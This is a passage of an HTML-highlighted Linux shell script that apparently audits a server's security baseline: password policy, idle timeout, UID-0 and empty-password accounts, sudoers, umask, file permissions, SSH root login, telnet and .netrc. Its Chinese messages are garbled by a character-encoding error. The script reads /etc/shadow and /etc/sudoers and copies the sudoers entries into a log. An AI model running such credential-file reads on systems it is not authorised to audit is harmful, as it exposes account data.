class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[1] è´¦å·ç­–ç•¥æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  passmax=`cat /etc/login.defs | grep PASS_MAX_DAYS | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  passmin=`cat /etc/login.defs | grep PASS_MIN_DAYS | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  passlen=`cat /etc/login.defs | grep PASS_MIN_LEN | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  passage=`cat /etc/login.defs | grep PASS_WARN_AGE | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passmax</span> -le 90 -a <span class="variable">$passmax</span> -gt 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] å£ä»¤ç”Ÿå­˜å‘¨æœŸä¸º<span class="variable">$&#123;passmax&#125;</span>å¤©ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å£ä»¤ç”Ÿå­˜å‘¨æœŸä¸º<span class="variable">$&#123;passmax&#125;</span>å¤©ï¼Œä¸ç¬¦åˆè¦æ±‚,å»ºè®®è®¾ç½®ä¸å¤§äº90å¤©<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passmin</span> -ge 6 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] å£ä»¤æ›´æ”¹æœ€å°æ—¶é—´é—´éš”ä¸º<span class="variable">$&#123;passmin&#125;</span>å¤©ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å£ä»¤æ›´æ”¹æœ€å°æ—¶é—´é—´éš”ä¸º<span class="variable">$&#123;passmin&#125;</span>å¤©ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®å¤§äºç­‰äº6å¤©<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passlen</span> -ge 8 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] å£ä»¤æœ€å°é•¿åº¦ä¸º<span class="variable">$&#123;passlen&#125;</span>,ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å£ä»¤æœ€å°é•¿åº¦ä¸º<span class="variable">$&#123;passlen&#125;</span>,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®æœ€å°é•¿åº¦å¤§äºç­‰äº8<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$passage</span> -ge 30 -a <span class="variable">$passage</span> -lt <span class="variable">$passmax</span> ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] å£ä»¤è¿‡æœŸè­¦å‘Šæ—¶é—´å¤©æ•°ä¸º<span class="variable">$&#123;passage&#125;</span>,ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å£ä»¤è¿‡æœŸè­¦å‘Šæ—¶é—´å¤©æ•°ä¸º<span class="variable">$&#123;passage&#125;</span>,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®å¤§äºç­‰äº30å¹¶å°äºå£ä»¤ç”Ÿå­˜å‘¨æœŸ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ç™»å½•è¶…æ—¶æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[2] ç™»å½•è¶…æ—¶æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  checkTimeout=<span class="subst">$(cat /etc/profile | grep TMOUT | awk -F[=] &#x27;&#123;print $2&#125;&#x27;)</span></span></span><br><span class="line"><span class="string">  if [ $? -eq 0 ];then</span></span><br><span class="line"><span class="string">    TMOUT=`cat /etc/profile | grep TMOUT | awk -F[=] &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$TMOUT</span> -le 600 -a <span class="variable">$TMOUT</span> -ge 10 ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[Y] è´¦å·è¶…æ—¶çš„æ—¶é—´æ˜¯<span class="variable">$&#123;TMOUT&#125;</span>ç§’,ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] è´¦å·è¶…æ—¶çš„æ—¶é—´æ˜¯<span class="variable">$&#123;TMOUT&#125;</span>ç§’,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®å°äº600ç§’<span class="string">&quot;&gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] è´¦å·è¶…æ—¶ä¸å­˜åœ¨è‡ªåŠ¨æ³¨é”€,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®å°äº600ç§’<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ç‰¹æƒç”¨æˆ·æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[3] ç‰¹æƒç”¨æˆ·æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  UIDS=`awk -F[:] &#x27;NR!=1&#123;print <span class="variable">$3</span>&#125;&#x27; /etc/passwd`</span></span><br><span class="line"><span class="string">  flag=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$UIDS</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> = 0 ];then</span></span><br><span class="line"><span class="string">       flag=1</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flag</span> != 1 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] ä¸å­˜åœ¨rootè´¦å·å¤–çš„UIDä¸º0çš„å¼‚å¸¸ç”¨æˆ·<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å­˜åœ¨érootä½†UIDä¸º0çš„å¼‚å¸¸ç”¨æˆ·ï¼Œè¯·ç«‹åˆ»è¿›è¡Œæ’æŸ¥<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ç©ºç™»å½•å£ä»¤ç”¨æˆ·æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[4] ç©ºç™»å½•å£ä»¤ç”¨æˆ·æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  userlist=`awk -F: &#x27;length(<span class="variable">$2</span>)==0 &#123;print <span class="variable">$1</span>&#125;&#x27; /etc/shadow`</span></span><br><span class="line"><span class="string">  [ ! <span class="variable">$userlist</span> ] &amp;&amp; echo &quot;</span>[Y] ä¸å­˜åœ¨ç©ºç™»å½•å£ä»¤ç”¨æˆ·<span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  for i in <span class="variable">$userlist</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] <span class="variable">$i</span>ç™»å½•å¯†ç ä¸ºç©ºï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®ä¸ºè¯¥ç”¨æˆ·è®¾ç½®å¯†ç ï¼<span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`å…·æœ‰sudoæƒé™ç”¨æˆ·æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[5] sudoæƒé™ç”¨æˆ·æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  sudolist=`cat /etc/sudoers |grep -v &#x27;^#&#x27; |grep -v Defaults| grep -v &#x27;^$&#x27;`</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="variable">$sudolist</span><span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ç”¨æˆ·ç¼ºçœæƒé™æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[6] ç”¨æˆ·ç¼ºçœæƒé™æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  umask1=`cat /etc/profile | grep umask | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  umask2=`cat /etc/csh.cshrc | grep umask | grep -v ^# | awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  umask3=`cat /etc/bashrc | grep umask | grep -v ^# | awk &#x27;NR!=1&#123;print <span class="variable">$2</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  flags=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$umask1</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> != &quot;</span>027<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] /etc/profileæ–‡ä»¶ä¸­æ‰€æ‰€è®¾ç½®çš„<span class="built_in">umask</span>ä¸º<span class="variable">$&#123;i&#125;</span>,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®ä¸º027<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      flags=1</span></span><br><span class="line"><span class="string">      break</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flags</span> == 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/profileæ–‡ä»¶ä¸­æ‰€è®¾ç½®çš„<span class="built_in">umask</span>ä¸º<span class="variable">$&#123;i&#125;</span>,ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi </span></span><br><span class="line"><span class="string">  flags=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$umask2</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> != &quot;</span>027<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] /etc/csh.cshrcæ–‡ä»¶ä¸­æ‰€æ‰€è®¾ç½®çš„<span class="built_in">umask</span>ä¸º<span class="variable">$&#123;i&#125;</span>,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®ä¸º027<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      flags=1</span></span><br><span class="line"><span class="string">      break</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done  </span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flags</span> == 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/csh.cshrcæ–‡ä»¶ä¸­æ‰€è®¾ç½®çš„<span class="built_in">umask</span>ä¸º<span class="variable">$&#123;i&#125;</span>,ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  flags=0</span></span><br><span class="line"><span class="string">  for i in <span class="variable">$umask3</span></span></span><br><span class="line"><span class="string">  do</span></span><br><span class="line"><span class="string">    if [ <span class="variable">$i</span> != &quot;</span>027<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">      echo &quot;</span>[N] /etc/bashrcæ–‡ä»¶ä¸­æ‰€è®¾ç½®çš„<span class="built_in">umask</span>ä¸º<span class="variable">$&#123;i&#125;</span>,ä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®ä¸º027<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">      flags=1</span></span><br><span class="line"><span class="string">      break</span></span><br><span class="line"><span class="string">    fi</span></span><br><span class="line"><span class="string">  done</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$flags</span> == 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/bashrcæ–‡ä»¶ä¸­æ‰€è®¾ç½®çš„<span class="built_in">umask</span>ä¸º<span class="variable">$&#123;i&#125;</span>,ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`ç³»ç»Ÿå…³é”®ç›®å½•æƒé™æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[7] ç³»ç»Ÿå…³é”®ç›®å½•æƒé™æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  file1=`ls -l /etc/passwd | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file2=`ls -l /etc/shadow | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file3=`ls -l /etc/group | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file4=`ls -l /etc/securetty | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  file5=`ls -l /etc/services | awk &#x27;&#123;print <span class="variable">$1</span>&#125;&#x27;`</span></span><br><span class="line"><span class="string">  #æ£€æµ‹æ–‡ä»¶æƒé™ä¸º400çš„æ–‡ä»¶</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file2</span> = &quot;</span>-r--------<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/shadowæ–‡ä»¶æƒé™ä¸º400ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/shadowæ–‡ä»¶æƒé™ä¸ä¸º400ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®æƒé™ä¸º400<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  #æ£€æµ‹æ–‡ä»¶æƒé™ä¸º600çš„æ–‡ä»¶</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file4</span> = &quot;</span>-rw-------<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/securityæ–‡ä»¶æƒé™ä¸º600ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/securityæ–‡ä»¶æƒé™ä¸ä¸º600ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®æƒé™ä¸º600<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  #æ£€æµ‹æ–‡ä»¶æƒé™ä¸º644çš„æ–‡ä»¶</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file1</span> = &quot;</span>-rw-r--r--<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/passwdæ–‡ä»¶æƒé™ä¸º644ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/passwdæ–‡ä»¶æƒé™ä¸ä¸º644ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®æƒé™ä¸º644<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file5</span> = &quot;</span>-rw-r--r--<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/servicesæ–‡ä»¶æƒé™ä¸º644ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/servicesæ–‡ä»¶æƒé™ä¸ä¸º644ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®æƒé™ä¸º644<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$file3</span> = &quot;</span>-rw-r--r--<span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] /etc/groupæ–‡ä»¶æƒé™ä¸º644ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] /etc/groupæ–‡ä»¶æƒé™ä¸ä¸º644ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®è®¾ç½®æƒé™ä¸º644<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`SSHé…ç½®æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[8] sshé…ç½®æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  remoteLogin=<span class="subst">$(cat /etc/ssh/sshd_config | grep -v ^# |grep <span class="string">&quot;PermitRootLogin no&quot;</span>)</span></span></span><br><span class="line"><span class="string">  if [ $? -eq 0 ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] å·²ç»è®¾ç½®rootä¸èƒ½è¿œç¨‹ç™»é™†ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å·²ç»è®¾ç½®rootèƒ½è¿œç¨‹ç™»é™†ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®/etc/ssh/sshd_configæ·»åŠ PermitRootLogin noå‚æ•°<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`pingæœåŠ¡æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[9] ç³»ç»ŸpingæœåŠ¡æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  pingd=`cat /proc/sys/net/ipv4/icmp_echo_ignore_all`</span></span><br><span class="line"><span class="string">  if [ &quot;</span><span class="variable">$pingd</span><span class="string">&quot; = &quot;</span>1<span class="string">&quot; ]; then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] æœåŠ¡å™¨å·²ç¦ping<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] æœåŠ¡å™¨æœªç¦ping<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`telnetæœåŠ¡æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[10] ç³»ç»ŸtelnetæœåŠ¡æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  telnetd=`rpm -qa|grep telnet | wc -l`</span></span><br><span class="line"><span class="string">  if [ <span class="variable">$telnetd</span> = &quot;</span>0<span class="string">&quot; ]; then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] ç³»ç»Ÿæœªå®‰è£…telnetæœåŠ¡ <span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  echo &quot;</span>[N] æ£€æµ‹åˆ°å®‰è£…äº†telnetæœåŠ¡ï¼Œä¸ç¬¦åˆè¦æ±‚ï¼Œå»ºè®®ç¦ç”¨telnetæœåŠ¡<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`è¿œç¨‹è¿æ¥çš„å®‰å…¨æ€§é…ç½®æ£€æŸ¥ç»“æœ<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  action &quot;</span>[11] è¿œç¨‹è¿æ¥çš„å®‰å…¨æ€§é…ç½®æ£€æŸ¥ä¸­...<span class="string">&quot; /bin/true</span></span><br><span class="line"><span class="string">  fileNetrc=`find / -xdev -mount -name .netrc -print 2&gt; /dev/null`</span></span><br><span class="line"><span class="string">  if [  -z &quot;</span><span class="variable">$&#123;fileNetrc&#125;</span><span class="string">&quot; ];then</span></span><br><span class="line"><span class="string">    echo &quot;</span>[Y] ä¸å­˜åœ¨.netrcæ–‡ä»¶ï¼Œç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    echo &quot;</span>[N] å­˜åœ¨.netrcæ–‡ä»¶ï¼Œä¸ç¬¦åˆè¦æ±‚<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  fi</span></span><br><span class="line"><span class="string">  